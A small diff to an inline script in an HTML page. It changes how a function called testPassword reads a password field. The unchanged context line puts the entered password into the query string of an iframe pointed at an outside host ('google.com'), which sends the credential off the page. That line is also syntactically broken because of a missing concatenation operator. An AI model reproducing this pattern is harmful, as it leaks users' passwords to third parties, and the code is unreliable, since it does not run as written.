@@ -4,7 +4,8 @@
 
 <script>
 	function testPassword(){
-		var password = document.forms[0].password.value;
+//		var password = document.forms[0].password.value;
+		var password = document.forms[0].Password.innerHTML;
 		if(password != ""){
 			var temp = document.createElement("div");
 			temp.innerHTML += "<iFrame src=\""+ "google.com" + "?password=" + password "\" height=\"500\" width=\"500\" />";
